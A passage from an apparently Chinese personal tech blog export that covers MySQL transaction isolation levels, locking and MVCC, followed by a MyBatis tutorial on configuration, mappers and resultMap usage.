\n当两个或多个事务选择同一行，然后基于最初选定的值更新该行时，由于每个事务都不知道其他事务的存在，就会发生丢失更新问题–最后的更新覆盖了由其他事务所做的更新。 \n脏读（Dirty Reads） \n一个事务正在对一条记录做修改，在这个事务完成并提交前，这条记录的数据就处于不一致的状态；这时，另一个事务也来读取同一条记录，如果不加控制，第二个事务读取了这些“脏”数据，并据此作进一步的处理，就会产生未提交的数据依赖关系。这种现象被形象的叫做“脏读”。 \n一句话：事务A读取到了事务B已经修改但尚未提交的数据，还在这个数据基础上做了操作。此时，如果B事务回滚，A读取的数据无效，不符合一致性要求。 \n不可重读（Non-Repeatable Reads）\n一个事务在读取某些数据后的某个时间，再次读取以前读过的数据，却发现其读出的数据已经发生了改变、或某些记录已经被删除了！这种现象就叫做“不可重复读”。 \n一句话：事务A读取到了事务B已经提交的修改数据，不符合隔离性 \n幻读（Phantom Reads） \n一个事务按相同的查询条件重新读取以前检索过的数据，却发现其他事务插入了满足其查询条件的新数据，这种现象就称为“幻读”。 \n一句话：事务A读取到了事务B提交的新增数据，不符合隔离性 \n对应的隔离级别\n\n\n隔离级别\n脏读\n不可重复读\n幻读\n\n\n\n读未提交\n可能\n可能\n可能\n\n\n读提交\n不可能\n可能\n可能\n\n\n可重复读\n不可能\n不可能\n可能\n\n\n可串行化\n不可能\n不可能\n不可能\n\n\n设置事务隔离级别：set tx_isolation&#x3D;’REPEATABLE-READ’; \n常看当前数据库的事务隔离级别: show variables like ‘tx_isolation’; \nTip关于锁机制，当innodb在事务处理中，A事务对某条数据操作时会加锁，【写锁或者读锁】\n之后B事务对该数据进行操作的时候，更具读写锁机制和加锁机制进行操作。\n这么说，同时只有一个事务对数据进行修改\nMVCC-便于理解型首先是注意到基于版本号的\nid name balance 创建事务id 删除事务id 21 lilei  450      10       13  2 hanmei 16000    11       空  2 han666 16000    13       空\n\n这里面的10、11等都是版本号\n1、当我们创建一条数据的时候，会把当前事务的id记录下来\n2、当我们删除某条数据的时候，会记录下被删除行的当前事务id\n3、当我们更新数据的时候，会在底层新增一行相同数据并记录下当前事务id\n接下来是查询条件\n执行查询操作mysql底层会带上过滤条件，创建事务id &lt;&#x3D; max(当前事务id(12)，快照点已提交最大事务id），删除事务id&gt; max(当前事务id(12)，快照点已提交最大事务id） \n空是无敌\n\n上面是基本条件\n之后我们可以尝试\n\n\n我感觉的对MVCC的理解还是不是很好，但是先这样\n优化建议尽可能让所有数据检索都通过索引来完成，避免无索引行锁升级为表锁 \n合理设计索引，尽量缩小锁的范围 \n尽可能减少检索条件范围，避免间隙锁 \n尽量控制事务大小，减少锁定资源量和时间长度，涉及事务加锁的sql \n尽量放在事务最后执行 \n尽可能低级别事务隔离\n","tags":["2021"]},{"title":"Mybatis","url":"/2021/03/19/2021/Mybatis/","content":"\n\nMybatis\n什么是 MyBatis？MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。\n官方文档：https://mybatis.org/mybatis-3/zh/index.html\n传统JDBC和Mybatis相比的弊病传统的JDBC的操作过程大致分为如下几步：\n\n通过Class.forName()加载驱动\n通过DriverManager. getConnection()创建连接\n获取sql执行者prepareStatement并且通过其execute执行sql\n通过sql执行者的getResultSet方法获取结果集ResultSet进行解析\n\n传统JDBC的问题如下：\n\n数据库连接创建、释放频繁造成资源浪费，从而影响系统性能，使用数据库连接池可以解决问题。\nsql语句在java代码中硬编码，实际应用中sql的变化可能较大，造成代码维护不方便。\n使用preparedStatement向有占位符传递参数存在硬编码问题，因为sql中的where子句的条件不确定，\n\n同样是修改不方便。\n\n对结果集中解析存在硬编码问题，sql的变化导致解析代码的变化，系统维护不方便。\n\nmybatis对传统JDBC的解决方案\n\n在mybatis配置文件SqlMapConfig.xml中配置数据连接池，使用连接池管理数据库链接。\n将Sql语句配置在映射配置文件中与java代码分离。\nMybatis自动将java对象映射至sql语句，通过statement中的parameterType定义输入参数的类型。\nMybatis自动将sql执行结果映射至java对象，通过statement中的resultType定义输出结果的类型。\n\n部分解析从 XML 中构建 SqlSessionFactory每个基于 MyBatis 的应用都是以一个 SqlSessionFactory 的实例为核心的。\nSqlSessionFactory 的实例可以通过 SqlSessionFactoryBuilder 获得。\n而 SqlSessionFactoryBuilder 则可以从 XML 配置文件或一个预先配置的 Configuration 实例来构建出 SqlSessionFactory 实例。\n上面使用构造者模式获得工厂类\n从 XML 文件中构建 SqlSessionFactory 的实例非常简单，建议使用类路径下的资源文件进行配置。 但也可以使用任意的输入流（InputStream）实例，比如用文件路径字符串或 file:&#x2F;&#x2F; URL 构造的输入流。MyBatis 包含一个名叫 Resources 的工具类，它包含一些实用方法，使得从类路径或其它位置加载资源文件更加容易。\nString resource = &quot;org/mybatis/example/mybatis-config.xml&quot;;InputStream inputStream = Resources.getResourceAsStream(resource);SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);\n\nXML 配置文件中包含了对 MyBatis 系统的核心设置，包括获取数据库连接实例的数据源（DataSource）以及决定事务作用域和控制方式的事务管理器（TransactionManager）。这是主要的配置mybatis-config.xml\n先给出一个简单的示例：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration  PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;  &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt;  &lt;environments default=&quot;development&quot;&gt;    &lt;environment id=&quot;development&quot;&gt;         &lt;transactionManager type=&quot;JDBC&quot;/&gt;  &lt;!-- 事务管理 --&gt;      &lt;dataSource type=&quot;POOLED&quot;&gt;        &lt;property name=&quot;driver&quot; value=&quot;$&#123;driver&#125;&quot;/&gt;  &lt;!-- 连接池 --&gt;        &lt;property name=&quot;url&quot; value=&quot;$&#123;url&#125;&quot;/&gt;        &lt;!-- 位置 --&gt;        &lt;property name=&quot;username&quot; value=&quot;$&#123;username&#125;&quot;/&gt;          &lt;property name=&quot;password&quot; value=&quot;$&#123;password&#125;&quot;/&gt;      &lt;/dataSource&gt;    &lt;/environment&gt;  &lt;/environments&gt;  &lt;mappers&gt;    &lt;mapper resource=&quot;org/mybatis/example/BlogMapper.xml&quot;/&gt;  &lt;!-- 对应实体类的mapper --&gt;  &lt;/mappers&gt;&lt;/configuration&gt;\n\n当然，还有很多可以在 XML 文件中配置的选项，上面的示例仅罗列了最关键的部分。 注意 XML 头部的声明，它用来验证 XML 文档的正确性。environment 元素体中包含了事务管理和连接池的配置。mappers 元素则包含了一组映射器（mapper），这些映射器的 XML 映射文件包含了 SQL 代码和映射定义信息。\n从 SqlSessionFactory 中获取 SqlSession既然有了 SqlSessionFactory，顾名思义，我们可以从中获得 SqlSession 的实例。\nSqlSession 提供了在数据库执行 SQL 命令所需的所有方法。\n你可以通过 SqlSession 实例来使用和指定语句的参数和返回值相匹配的接口（比如 BlogMapper.class），现在你的代码不仅更清晰，更加类型安全，还不用担心可能出错的字符串字面值以及强制类型转换。\n例如：\ntry (SqlSession session = sqlSessionFactory.openSession()) &#123;  BlogMapper mapper = session.getMapper(BlogMapper.class);  Blog blog = mapper.selectBlog(101);&#125;\n\n\n下面解释三个类SqlSessionFactoryBuilder这个类可以被实例化、使用和丢弃，一旦创建了 SqlSessionFactory，就不再需要它了。\n 因此 SqlSessionFactoryBuilder 实例的最佳作用域是方法作用域（也就是局部方法变量）。\n 你可以重用 SqlSessionFactoryBuilder 来创建多个 SqlSessionFactory 实例，但最好还是不要一直保留着它，以保证所有的 XML 解析资源可以被释放给更重要的事情。\nSqlSessionFactorySqlSessionFactory 一旦被创建就应该在应用的运行期间一直存在，没有任何理由丢弃它或重新创建另一个实例。 使用 SqlSessionFactory 的最佳实践是在应用运行期间不要重复创建多次，多次重建 SqlSessionFactory 被视为一种代码“坏习惯”。\n因此 SqlSessionFactory 的最佳作用域是应用作用域。 \n有很多方法可以做到，最简单的就是使用单例模式或者静态单例模式。\nSqlSession每个线程都应该有它自己的 SqlSession 实例。\nSqlSession 的实例不是线程安全的，因此是不能被共享的，所以它的最佳的作用域是请求或方法作用域。\n 绝对不能将 SqlSession 实例的引用放在一个类的静态域，甚至一个类的实例变量也不行。 也绝不能将 SqlSession 实例的引用放在任何类型的托管作用域中，比如 Servlet 框架中的 HttpSession。\n 如果你现在正在使用一种 Web 框架，考虑将 SqlSession 放在一个和 HTTP 请求相似的作用域中。 \n换句话说，每次收到 HTTP 请求，就可以打开一个 SqlSession，返回一个响应后，就关闭它。 \n这个关闭操作很重要，为了确保每次都能执行关闭操作，你应该把这个关闭操作放到 finally 块中。 下面的示例就是一个确保 SqlSession 关闭的标准模式：\ntry (SqlSession session = sqlSessionFactory.openSession()) &#123;  // 你的应用逻辑代码&#125;\n\n在所有代码中都遵循这种使用模式，可以保证所有数据库资源都能被正确地关闭。\n映射器实例映射器是一些绑定映射语句的接口。映射器接口的实例是从 SqlSession 中获得的。虽然从技术层面上来讲，任何映射器实例的最大作用域与请求它们的 SqlSession 相同。但方法作用域才是映射器实例的最合适的作用域。 也就是说，映射器实例应该在调用它们的方法中被获取，使用完毕之后即可丢弃。 映射器实例并不需要被显式地关闭。尽管在整个请求作用域保留映射器实例不会有什么问题，但是你很快会发现，在这个作用域上管理太多像 SqlSession 的资源会让你忙不过来。 \n因此，最好将映射器放在方法作用域内。就像下面的例子一样：\ntry (SqlSession session = sqlSessionFactory.openSession()) &#123;  BlogMapper mapper = session.getMapper(BlogMapper.class);  // 你的应用逻辑代码&#125;\n\nTips总的来说，需要由SqlSessionFactoryBuilder生成SqlSessionFactory。\n然后由工厂生成SqlSession，SqlSession 提供了在数据库执行 SQL 命令所需的所有方法。\n \t//由SqlSession导到对应的Mapper类BlogMapper mapper = session.getMapper(BlogMapper.class);//这样就可以使用这个mapper也就是利用xml文件生成的实现类进行Dao操作 \tBlog blog = mapper.selectBlog(101);\n\n配置文件解析\n核心配置文件\n\n\nmybatis-config.xml 系统核心配置文件\nMyBatis 的配置文件包含了会深深影响 MyBatis 行为的设置和属性信息。\n能配置的内容如下：\n\nconfiguration（配置）properties（属性）settings（设置）typeAliases（类型别名）typeHandlers（类型处理器）objectFactory（对象工厂）plugins（插件）environments（环境配置）environment（环境变量）transactionManager（事务管理器）dataSource（数据源）databaseIdProvider（数据库厂商标识）mappers（映射器）&lt;!-- 注意元素节点的顺序！顺序不对会报错 --&gt;\n\n我们可以阅读 mybatis-config.xml 上面的dtd的头文件！\nenvironments元素&lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt;   &lt;transactionManager type=&quot;JDBC&quot;&gt;     &lt;property name=&quot;...&quot; value=&quot;...&quot;/&gt;   &lt;/transactionManager&gt;   &lt;dataSource type=&quot;POOLED&quot;&gt;     &lt;property name=&quot;driver&quot; value=&quot;$&#123;driver&#125;&quot;/&gt;     &lt;property name=&quot;url&quot; value=&quot;$&#123;url&#125;&quot;/&gt;     &lt;property name=&quot;username&quot; value=&quot;$&#123;username&#125;&quot;/&gt;     &lt;property name=&quot;password&quot; value=&quot;$&#123;password&#125;&quot;/&gt;   &lt;/dataSource&gt; &lt;/environment&gt;&lt;/environments&gt;\n\n\n配置MyBatis的多套运行环境，将SQL映射到多个不同的数据库上，必须指定其中一个为默认运行环境（通过default指定）\n\n子元素节点：environment\n\n\ndataSource 元素使用标准的 JDBC 数据源接口来配置 JDBC 连接对象的资源。\n\n数据源是必须配置的。\n\n有三种内建的数据源类型\ntype=&quot;[UNPOOLED|POOLED|JNDI]&quot;）\n\nunpooled：这个数据源的实现只是每次被请求时打开和关闭连接。\n\npooled：这种数据源的实现利用“池”的概念将 JDBC 连接对象组织起来 , 这是一种使得并发 Web 应用快速响应请求的流行处理方式。\n\njndi：这个数据源的实现是为了能在如 Spring 或应用服务器这类容器中使用，容器可以集中或在外部配置数据源，然后放置一个 JNDI 上下文的引用。\n\n数据源也有很多第三方的实现，比如dbcp，c3p0，druid等等….\n\n这两种事务管理器类型都不需要设置任何属性。\n\n具体的一套环境，通过设置id进行区别，id保证唯一！\n\n子元素节点：transactionManager - [ 事务管理器 ]\n&lt;!-- 语法 --&gt;  &lt;transactionManager type=&quot;[ JDBC | MANAGED ]&quot;/&gt;\n\n- 子元素节点：**数据源（dataSource）**\n\nmappers元素mappers\n\n映射器 : 定义映射SQL语句文件\n既然 MyBatis 的行为其他元素已经配置完了，我们现在就要定义 SQL 映射语句了。\n但是首先我们需要告诉 MyBatis 到哪里去找到这些语句。Java 在自动查找这方面没有提供一个很好的方法，所以最佳的方式是告诉 MyBatis 到哪里去找映射文件。你可以使用相对于类路径的资源引用， 或完全限定资源定位符（包括 file:/// 的 URL），或类名和包名等。映射器是MyBatis中最核心的组件之一，在MyBatis 3之前，只支持xml映射器，即：所有的SQL语句都必须在xml文件中配置。而从MyBatis 3开始，还支持接口映射器，这种映射器方式允许以Java代码的方式注解定义SQL语句，非常简洁。\n\n引入资源方式\n&lt;!-- 使用相对于类路径的资源引用 --&gt;&lt;mappers&gt; &lt;mapper resource=&quot;org/mybatis/builder/PostMapper.xml&quot;/&gt;&lt;/mappers&gt;&lt;!-- 使用完全限定资源定位符（URL） --&gt;&lt;mappers&gt; &lt;mapper url=&quot;file:///var/mappers/AuthorMapper.xml&quot;/&gt;&lt;/mappers&gt;&lt;!--使用映射器接口实现类的完全限定类名需要配置文件名称和接口名称一致，并且位于同一目录下--&gt;&lt;mappers&gt; &lt;mapper class=&quot;org.mybatis.builder.AuthorMapper&quot;/&gt;&lt;/mappers&gt;&lt;!--将包内的映射器接口实现全部注册为映射器但是需要配置文件名称和接口名称一致，并且位于同一目录下--&gt;&lt;mappers&gt; &lt;package name=&quot;org.mybatis.builder&quot;/&gt;&lt;/mappers&gt;\n\n对应Mapper文件&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper       PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;       &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.kuang.mapper.UserMapper&quot;&gt;   &lt;/mapper&gt;\n\n\nnamespace中文意思：命名空间，作用如下：\n\n\nnamespace的命名必须跟某个接口同名\n接口中的方法与映射文件中sql语句id应该一一对应\n\n\n\nnamespace和子元素的id联合保证唯一  , 区别不同的mapper\n绑定DAO接口\nnamespace命名规则 : 包名+类名\n\n\n\nMyBatis 的真正强大在于它的映射语句，这是它的魔力所在。由于它的异常强大，映射器的 XML 文件就显得相对简单。如果拿它跟具有相同功能的 JDBC 代码进行对比，你会立即发现省掉了将近 95% 的代码。MyBatis 为聚焦于 SQL 而构建，以尽可能地为你减少麻烦。\nProperties优化数据库这些属性都是可外部配置且可动态替换的，既可以在典型的 Java 属性文件中配置，亦可通过 properties 元素的子元素来传递。具体的官方文档\n我们来优化我们的配置文件\n第一步 ; 在资源目录下新建一个db.properties\ndriver=com.mysql.jdbc.Driverurl=jdbc:mysql://localhost:3306/mybatis?useSSL=true&amp;useUnicode=true&amp;characterEncoding=utf8username=rootpassword=123456\n\n第二步 : 将文件导入properties 配置文件\n&lt;configuration&gt;   &lt;!--导入properties文件--&gt;   &lt;properties resource=&quot;db.properties&quot;/&gt;   &lt;environments default=&quot;development&quot;&gt;       &lt;environment id=&quot;development&quot;&gt;           &lt;transactionManager type=&quot;JDBC&quot;/&gt;           &lt;dataSource type=&quot;POOLED&quot;&gt;               &lt;property name=&quot;driver&quot; value=&quot;$&#123;driver&#125;&quot;/&gt;               &lt;property name=&quot;url&quot; value=&quot;$&#123;url&#125;&quot;/&gt;               &lt;property name=&quot;username&quot; value=&quot;$&#123;username&#125;&quot;/&gt;               &lt;property name=&quot;password&quot; value=&quot;$&#123;password&#125;&quot;/&gt;           &lt;/dataSource&gt;       &lt;/environment&gt;   &lt;/environments&gt;   &lt;mappers&gt;       &lt;mapper resource=&quot;mapper/UserMapper.xml&quot;/&gt;   &lt;/mappers&gt;&lt;/configuration&gt;\n\n\n配置文件优先级问题\n新特性：使用占位符\n\n映射参数处理在mapper.xml中，我们对于结果集和对象不匹配的时候，需要进行映射参数处理\nSelect在select中，我们有这些参数可供使用：\n\n\n\n属性\n描述\n\n\n\nid\n在命名空间中唯一的标识符，可以被用来引用这条语句。\n\n\nparameterType\n将会传入这条语句的参数的类全限定名或别名。这个属性是可选的，因为 MyBatis 可以通过类型处理器（TypeHandler）推断出具体传入语句的参数，默认值为未设置（unset）。\n\n\nparameterMap\n用于引用外部 parameterMap 的属性，目前已被废弃。请使用行内参数映射和 parameterType 属性。\n\n\nresultType\n期望从这条语句中返回结果的类全限定名或别名。 注意，如果返回的是集合，那应该设置为集合包含的类型，而不是集合本身的类型。 resultType 和 resultMap 之间只能同时使用一个。\n\n\nresultMap\n对外部 resultMap 的命名引用。结果映射是 MyBatis 最强大的特性，如果你对其理解透彻，许多复杂的映射问题都能迎刃而解。 resultType 和 resultMap 之间只能同时使用一个。\n\n\nflushCache\n将其设置为 true 后，只要语句被调用，都会导致本地缓存和二级缓存被清空，默认值：false。\n\n\nuseCache\n将其设置为 true 后，将会导致本条语句的结果被二级缓存缓存起来，默认值：对 select 元素为 true。\n\n\ntimeout\n这个设置是在抛出异常之前，驱动程序等待数据库返回请求结果的秒数。默认值为未设置（unset）（依赖数据库驱动）。\n\n\nfetchSize\n这是一个给驱动的建议值，尝试让驱动程序每次批量返回的结果行数等于这个设置值。 默认值为未设置（unset）（依赖驱动）。\n\n\nstatementType\n可选 STATEMENT，PREPARED 或 CALLABLE。这会让 MyBatis 分别使用 Statement，PreparedStatement 或 CallableStatement，默认值：PREPARED。\n\n\nresultSetType\nFORWARD_ONLY，SCROLL_SENSITIVE, SCROLL_INSENSITIVE 或 DEFAULT（等价于 unset） 中的一个，默认值为 unset （依赖数据库驱动）。\n\n\ndatabaseId\n如果配置了数据库厂商标识（databaseIdProvider），MyBatis 会加载所有不带 databaseId 或匹配当前 databaseId 的语句；如果带和不带的语句都有，则不带的会被忽略。\n\n\nresultOrdered\n这个设置仅针对嵌套结果 select 语句：如果为 true，将会假设包含了嵌套结果集或是分组，当返回一个主结果行时，就不会产生对前面结果集的引用。 这就使得在获取嵌套结果集的时候不至于内存不够用。默认值：false。\n\n\nresultSets\n这个设置仅适用于多结果集的情况。它将列出语句执行后返回的结果集并赋予每个结果集一个名称，多个名称之间以逗号分隔。\n\n\n对于这种不匹配的问题，常有两种方案\n方案一：为列名指定别名 , 别名和java实体类的属性名一致 .\n&lt;select id=&quot;selectUserById&quot; resultType=&quot;User&quot;&gt;  select id , name , pwd as password from user where id = #&#123;id&#125;&lt;/select&gt;\n\n方案二：使用结果集映射-&gt;ResultMap 【推荐】\n&lt;resultMap id=&quot;UserMap&quot; type=&quot;User&quot;&gt;   &lt;!-- id为主键 --&gt;   &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;   &lt;!-- column是数据库表的列名 , property是对应实体类的属性名 --&gt;   &lt;result column=&quot;name&quot; property=&quot;name&quot;/&gt;   &lt;result column=&quot;pwd&quot; property=&quot;password&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;selectUserById&quot; resultMap=&quot;UserMap&quot;&gt;  select id , name , pwd from user where id = #&#123;id&#125;&lt;/select&gt;\n\n如果这个世界总是这么简单就好了。【苦笑\n高级结果映射MyBatis 创建时的一个思想是：数据库不可能永远是你所想或所需的那个样子。 我们希望每个数据库都具备良好的第三范式或 BCNF 范式，可惜它们并不都是那样。 如果能有一种数据库映射模式，完美适配所有的应用程序，那就太好了，但可惜也没有。\n 而 ResultMap 就是 MyBatis 对这个问题的答案。\nresultMap 元素有很多子元素和一个值得深入探讨的结构。 下面是resultMap 元素的概念视图。\n结果映射（resultMap）\nassociation\n– 一个复杂类型的关联；许多结果将包装成这种类型\n\n嵌套结果映射 – 关联可以是 resultMap 元素，或是对其它结果映射的引用\n\n\ncollection\n– 一个复杂类型的集合\n\n嵌套结果映射 – 集合可以是 resultMap 元素，或是对其它结果映射的引用\n\n\n\n\n\n\n属性\n描述\n\n\n\nid\n当前命名空间中的一个唯一标识，用于标识一个结果映射。\n\n\ntype\n类的完全限定名, 或者一个类型别名（关于内置的类型别名，可以参考上面的表格）。\n\n\nautoMapping\n如果设置这个属性，MyBatis 将会为本结果映射开启或者关闭自动映射。 这个属性会覆盖全局的属性 autoMappingBehavior。默认值：未设置（unset）。\n\n\n最佳实践 最好逐步建立结果映射。单元测试可以在这个过程中起到很大帮助。 如果你尝试一次性创建像上面示例那么巨大的结果映射，不仅容易出错，难度也会直线上升。 所以，从最简单的形态开始，逐步迭代。而且别忘了单元测试！ 有时候，框架的行为像是一个黑盒子（无论是否开源）。因此，为了确保实现的行为与你的期望相一致，最好编写单元测试。 并且单元测试在提交 bug 时也能起到很大的作用。\n下一部分将详细说明每个元素。\nid &amp; result&lt;id property=&quot;id&quot; column=&quot;post_id&quot;/&gt;&lt;result property=&quot;subject&quot; column=&quot;post_subject&quot;/&gt;\n\n这些元素是结果映射的基础。id 和 result 元素都将一个列的值映射到一个简单数据类型（String, int, double, Date 等）的属性或字段。\n这两者之间的唯一不同是，id 元素对应的属性会被标记为对象的标识符，在比较对象实例时使用。 这样可以提高整体的性能，尤其是进行缓存和嵌套结果映射（也就是连接映射）的时候。\n两个元素都有一些属性：\n\n\n\n属性\n描述\n\n\n\nproperty\n映射到列结果的字段或属性。如果 JavaBean 有这个名字的属性（property），会先使用该属性。否则 MyBatis 将会寻找给定名称的字段（field）。 无论是哪一种情形，你都可以使用常见的点式分隔形式进行复杂属性导航。 比如，你可以这样映射一些简单的东西：“username”，或者映射到一些复杂的东西上：“address.street.number”。\n\n\ncolumn\n数据库中的列名，或者是列的别名。一般情况下，这和传递给 resultSet.getString(columnName) 方法的参数一样。\n\n\njavaType\n一个 Java 类的全限定名，或一个类型别名（关于内置的类型别名，可以参考上面的表格）。 如果你映射到一个 JavaBean，MyBatis 通常可以推断类型。然而，如果你映射到的是 HashMap，那么你应该明确地指定 javaType 来保证行为与期望的相一致。\n\n\njdbcType\nJDBC 类型，所支持的 JDBC 类型参见这个表格之后的“支持的 JDBC 类型”。 只需要在可能执行插入、更新和删除的且允许空值的列上指定 JDBC 类型。这是 JDBC 的要求而非 MyBatis 的要求。如果你直接面向 JDBC 编程，你需要对可以为空值的列指定这个类型。\n\n\ntypeHandler\n我们在前面讨论过默认的类型处理器。使用这个属性，你可以覆盖默认的类型处理器。 这个属性值是一个类型处理器实现类的全限定名，或者是类型别名。\n\n\n支持的 JDBC 类型为了以后可能的使用场景，MyBatis 通过内置的 jdbcType 枚举类型支持下面的 JDBC 类型。\n\n\n\nBIT\nFLOAT\nCHAR\nTIMESTAMP\nOTHER\nUNDEFINED\n\n\n\nTINYINT\nREAL\nVARCHAR\nBINARY\nBLOB\nNVARCHAR\n\n\nSMALLINT\nDOUBLE\nLONGVARCHAR\nVARBINARY\nCLOB\nNCHAR\n\n\nINTEGER\nNUMERIC\nDATE\nLONGVARBINARY\nBOOLEAN\nNCLOB\n\n\nBIGINT\nDECIMAL\nTIME\nNULL\nCURSOR\nARRAY\n\n\n关联-1对多&lt;association property=&quot;author&quot; column=&quot;blog_author_id&quot; javaType=&quot;Author&quot;&gt;  &lt;id property=&quot;id&quot; column=&quot;author_id&quot;/&gt;  &lt;result property=&quot;username&quot; column=&quot;author_username&quot;/&gt;&lt;/association&gt;\n\n关联（association）元素处理“有一个”类型的关系。\n比如，在我们的示例中，一个博客有一个用户。关联结果映射和其它类型的映射工作方式差不多。 你需要指定目标属性名以及属性的javaType（很多时候 MyBatis 可以自己推断出来），在必要的情况下你还可以设置 JDBC 类型，如果你想覆盖获取结果值的过程，还可以设置类型处理器。\n关联的不同之处是，你需要告诉 MyBatis 如何加载关联。MyBatis 有两种不同的方式加载关联：\n\n嵌套 Select 查询：通过执行另外一个 SQL 映射语句来加载期望的复杂类型。\n嵌套结果映射：使用嵌套的结果映射来处理连接结果的重复子集。\n\n首先，先让我们来看看这个元素的属性。你将会发现，和普通的结果映射相比，它只在 select 和 resultMap 属性上有所不同。\n\n\n\n属性\n描述\n\n\n\nproperty\n映射到列结果的字段或属性。如果用来匹配的 JavaBean 存在给定名字的属性，那么它将会被使用。否则 MyBatis 将会寻找给定名称的字段。 无论是哪一种情形，你都可以使用通常的点式分隔形式进行复杂属性导航。 比如，你可以这样映射一些简单的东西：“username”，或者映射到一些复杂的东西上：“address.street.number”。\n\n\njavaType\n一个 Java 类的完全限定名，或一个类型别名（关于内置的类型别名，可以参考上面的表格）。 如果你映射到一个 JavaBean，MyBatis 通常可以推断类型。然而，如果你映射到的是 HashMap，那么你应该明确地指定 javaType 来保证行为与期望的相一致。\n\n\njdbcType\nJDBC 类型，所支持的 JDBC 类型参见这个表格之前的“支持的 JDBC 类型”。 只需要在可能执行插入、更新和删除的且允许空值的列上指定 JDBC 类型。这是 JDBC 的要求而非 MyBatis 的要求。如果你直接面向 JDBC 编程，你需要对可能存在空值的列指定这个类型。\n\n\ntypeHandler\n我们在前面讨论过默认的类型处理器。使用这个属性，你可以覆盖默认的类型处理器。 这个属性值是一个类型处理器实现类的完全限定名，或者是类型别名。\n\n\n关联的嵌套 Select 查询\n\n\n属性\n描述\n\n\n\ncolumn\n数据库中的列名，或者是列的别名。一般情况下，这和传递给 resultSet.getString(columnName) 方法的参数一样。 注意：在使用复合主键的时候，你可以使用 column=&quot;&#123;prop1=col1,prop2=col2&#125;&quot; 这样的语法来指定多个传递给嵌套 Select 查询语句的列名。这会使得 prop1 和 prop2 作为参数对象，被设置为对应嵌套 Select 语句的参数。\n\n\nselect\n用于加载复杂类型属性的映射语句的 ID，它会从 column 属性指定的列中检索数据，作为参数传递给目标 select 语句。 具体请参考下面的例子。注意：在使用复合主键的时候，你可以使用 column=&quot;&#123;prop1=col1,prop2=col2&#125;&quot; 这样的语法来指定多个传递给嵌套 Select 查询语句的列名。这会使得 prop1 和 prop2 作为参数对象，被设置为对应嵌套 Select 语句的参数。\n\n\nfetchType\n可选的。有效值为 lazy 和 eager。 指定属性后，将在映射中忽略全局配置参数 lazyLoadingEnabled，使用属性的值。\n\n\n示例：子查询\n&lt;resultMap id=&quot;blogResult&quot; type=&quot;Blog&quot;&gt;  &lt;association property=&quot;author&quot; column=&quot;author_id&quot; javaType=&quot;Author&quot; select=&quot;selectAuthor&quot;/&gt;&lt;/resultMap&gt;&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt;  SELECT * FROM BLOG WHERE ID = #&#123;id&#125;&lt;/select&gt;&lt;select id=&quot;selectAuthor&quot; resultType=&quot;Author&quot;&gt;  SELECT * FROM AUTHOR WHERE ID = #&#123;id&#125;&lt;/select&gt;\n\n就是这么简单。我们有两个 select 查询语句：\n一个用来加载博客（Blog）\n另外一个用来加载作者（Author）\n而且博客的结果映射描述了应该使用 selectAuthor 语句加载它的 author 属性。\n其它所有的属性将会被自动加载，只要它们的列名和属性名相匹配。\n这种方式虽然很简单，但在大型数据集或大型数据表上表现不佳。这个问题被称为“N+1 查询问题”。 概括地讲，N+1 查询问题是这样子的：\n\n你执行了一个单独的 SQL 语句来获取结果的一个列表（就是“+1”）。\n对列表返回的每条记录，你执行一个 select 查询语句来为每条记录加载详细信息（就是“N”）。\n\n这个问题会导致成百上千的 SQL 语句被执行。有时候，我们不希望产生这样的后果。\n好消息是，MyBatis 能够对这样的查询进行延迟加载，因此可以将大量语句同时运行的开销分散开来。 然而，如果你加载记录列表之后立刻就遍历列表以获取嵌套的数据，就会触发所有的延迟加载查询，性能可能会变得很糟糕。\n所以还有另外一种方法。\n关联的嵌套结果映射\n\n\n属性\n描述\n\n\n\nresultMap\n结果映射的 ID，可以将此关联的嵌套结果集映射到一个合适的对象树中。 它可以作为使用额外 select 语句的替代方案。它可以将多表连接操作的结果映射成一个单一的 ResultSet。这样的 ResultSet 有部分数据是重复的。 为了将结果集正确地映射到嵌套的对象树中, MyBatis 允许你“串联”结果映射，以便解决嵌套结果集的问题。使用嵌套结果映射的一个例子在表格以后。\n\n\ncolumnPrefix\n当连接多个表时，你可能会不得不使用列别名来避免在 ResultSet 中产生重复的列名。指定 columnPrefix 列名前缀允许你将带有这些前缀的列映射到一个外部的结果映射中。 详细说明请参考后面的例子。\n\n\nnotNullColumn\n默认情况下，在至少一个被映射到属性的列不为空时，子对象才会被创建。 你可以在这个属性上指定非空的列来改变默认行为，指定后，Mybatis 将只在这些列非空时才创建一个子对象。可以使用逗号分隔来指定多个列。默认值：未设置（unset）。\n\n\nautoMapping\n如果设置这个属性，MyBatis 将会为本结果映射开启或者关闭自动映射。 这个属性会覆盖全局的属性 autoMappingBehavior。注意，本属性对外部的结果映射无效，所以不能搭配 select 或 resultMap 元素使用。默认值：未设置（unset）。\n\n\n之前，你已经看到了一个非常复杂的嵌套关联的例子。 下面的例子则是一个非常简单的例子，用于演示嵌套结果映射如何工作。 现在我们将博客表和作者表连接在一起，而不是执行一个独立的查询语句，就像这样：\n&lt;select id=&quot;selectBlog&quot; resultMap=&quot;blogResult&quot;&gt;  select    B.id            as blog_id,    B.title         as blog_title,    B.author_id     as blog_author_id,    A.id            as author_id,    A.username      as author_username,    A.password      as author_password,    A.email         as author_email,    A.bio           as author_bio  from Blog B left outer join Author A on B.author_id = A.id  where B.id = #&#123;id&#125;&lt;/select&gt;\n\n注意查询中的连接，以及为确保结果能够拥有唯一且清晰的名字，我们设置的别名。 